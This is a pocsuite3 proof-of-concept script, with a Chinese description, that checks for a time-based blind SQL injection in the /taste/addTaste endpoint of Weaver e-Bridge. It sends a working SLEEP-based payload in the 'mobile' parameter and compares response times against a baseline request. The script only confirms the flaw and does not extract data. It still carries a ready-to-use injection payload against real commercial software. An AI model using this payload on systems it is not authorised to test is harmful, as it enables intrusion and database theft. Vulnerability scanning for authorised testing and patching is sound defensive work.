from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 云桥e-Bridge /addTaste 存在SQL注入漏洞'
    appName = '泛微 云桥e-Bridge'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司云桥e-Bridge /addTaste 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"
        }
        base_path = "/taste/addTaste?company=111&userName=111&openid=111&source=111&mobile=111%27%20AND%20(SELECT%207604%20FROM%20(SELECT(SLEEP(0)))ZQXL)--%20YAby"
        inject_path = "/taste/addTaste?company=111&userName=111&openid=111&source=111&mobile=111%27%20AND%20(SELECT%207604%20FROM%20(SELECT(SLEEP(5)))ZQXL)--%20YAby"
        base_url = self.url+base_path
        inject_url = self.url+inject_path
        base_resp = requests.post(url=base_url, headers=headers, verify=False, allow_redirects=False, timeout=20)
        inject_resp = requests.post(url=inject_url, headers=headers, verify=False, allow_redirects=False, timeout=20)
        base_time = base_resp.elapsed.total_seconds()
        inject_time = inject_resp.elapsed.total_seconds()
        if inject_resp.status_code == 200 and base_resp.status_code == 200 and (inject_time - base_time) >= 4.5 and (inject_time - base_time) <= 5.5 and '"status":1,"ShiroFilter.FILTERED":true' in inject_resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = inject_url
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
